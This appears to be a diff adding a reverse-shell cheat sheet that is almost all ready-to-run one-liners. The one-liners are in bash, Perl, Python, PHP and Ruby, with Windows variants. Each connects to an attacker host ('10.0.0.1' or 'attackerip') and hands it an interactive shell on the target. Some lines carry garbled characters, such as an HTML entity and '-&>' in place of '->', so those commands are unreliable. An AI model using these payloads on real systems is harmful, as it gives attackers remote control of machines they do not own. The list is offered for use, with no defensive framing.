@@ -1,0 +1,43 @@
+CREATE A REVERSE SHELL
+BASH
+Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10)
+
+$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+OR
+$ exec /bin/bash 0&amp;0 2>&0
+OR
+$ 0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+OR
+$ exec 5<>/dev/tcp/attackerip/4444
+$ cat <&5 | while read line; do $line 2>&5 >&5; done # or:
+$ while read line 0<&5; do $line 2>&5 >&5; done
+
+PERL
+Here’s a short, feature-free version that depends on /bin/sh:
+$ perl -e 'use Socket;$i="10.0.0.1"; $p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Perl reverse shell that does not depend on /bin/sh:
+$ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&>fdopen($c,r);
+$~-&>fdopen($c,w);system$_ while<>;'
+
+If the target system is running Windows use the following one-liner:
+$ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&>fdopen($c,r);
+$~-&>fdopen($c,w);system$_ while<>;'
+
+PYTHON
+This was tested under Linux / Python 2.7
+$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PHP
+This code assumes that the TCP connection uses file descriptor 3. This worked on most tested system. If it doesn’t work, try 4, 5, 6 …
+$ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+RUBY
+Short version that depends on /bin/sh:
+$ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+Longer Ruby reverse shell that does not depend on /bin/sh:
+$ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+If the target system is running Windows use the following one-liner:
+$ ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
